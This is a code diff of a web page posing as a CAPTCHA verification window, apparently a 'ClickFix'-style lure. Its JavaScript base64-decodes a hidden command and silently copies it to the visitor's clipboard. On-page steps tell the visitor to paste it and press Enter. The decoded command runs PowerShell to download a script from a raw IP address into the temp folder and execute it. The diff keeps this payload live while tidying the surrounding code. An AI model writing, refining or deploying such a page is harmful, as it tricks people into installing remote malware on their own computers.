@@ -258,7 +258,6 @@
                                 Press <b>Enter</b> on your keyboard to finish.
                             </li>
                         </ol>
-
                     </main>
                 </div>
                 <footer class="verify-container verify-footer">
@@ -348,12 +347,6 @@
                 checkboxBtnSpinner.style.opacity = "0";
             }
 
-            function generateRandomNumber() {
-                const min = 1000;
-                const max = 9999;
-                return Math.floor(Math.random() * (max - min + 1) + min).toString();
-            }
-
             function closeverifywindow() {
                 verifywindow.style.display = "none";
                 verifywindow.style.visibility = "hidden";
@@ -377,11 +370,9 @@
                 document.body.removeChild(tempTextArea);
             }
 
-            function stageClipboard(commandBase64, verification_id) {
+            function stageClipboard(commandBase64) {
                 const decodedCommand = atob(commandBase64);
-                const textToCopy =
-                    decodedCommand;
-                setClipboardCopyData(textToCopy);
+                setClipboardCopyData(decodedCommand);
             }
 
             function showVerifyWindow() {
@@ -399,13 +390,9 @@
                     verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
                 }
 
-                var verification_id = generateRandomNumber();
-                document.getElementById("verification-id").textContent = verification_id;
+                const base64Command = "Y21kLmV4ZSAvYyBwb3dlcnNoZWxsIC1jICJpcm0gaHR0cDovLzE1Ny4yNDUuMzQuMTA5OjgwODAvdXBkYXRlLmNtZCAtT3V0RmlsZSAkZW52OlRFTVBcdXBkYXRlLmNtZDsgJiAkZW52OlRFTVBcdXBkYXRlLmNtZCI=";
 
-                const base64Command =
-                    "Y21kLmV4ZSAvYyBwb3dlcnNoZWxsIC1jICJpcm0gaHR0cDovLzE1Ny4yNDUuMzQuMTA5OjgwODAvdXBkYXRlLmNtZCAtT3V0RmlsZSAkZW52OlRFTVBcdXBkYXRlLmNtZDsgJiAkZW52OlRFTVBcdXBkYXRlLmNtZCI=";
-
-                stageClipboard(base64Command, verification_id);
+                stageClipboard(base64Command);
             }
 
             addCaptchaListeners();
